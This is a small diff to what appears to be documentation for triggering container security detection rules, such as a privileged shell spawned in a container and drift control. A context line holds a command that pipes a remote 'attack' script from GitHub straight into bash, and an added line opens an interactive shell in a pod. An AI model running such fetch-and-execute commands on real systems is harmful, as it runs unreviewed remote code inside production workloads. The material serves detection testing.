@@ -288,3 +288,8 @@ Privileged Shell Spawned Inside Container
 ```
 sh -c curl https://raw.githubusercontent.com/sysdiglabs/policy-editor-attack/master/run.sh | bash
 ```
+
+Drift Control:
+```
+kubectl exec -it pod/<pod-name> -n storefront -- sh
+```
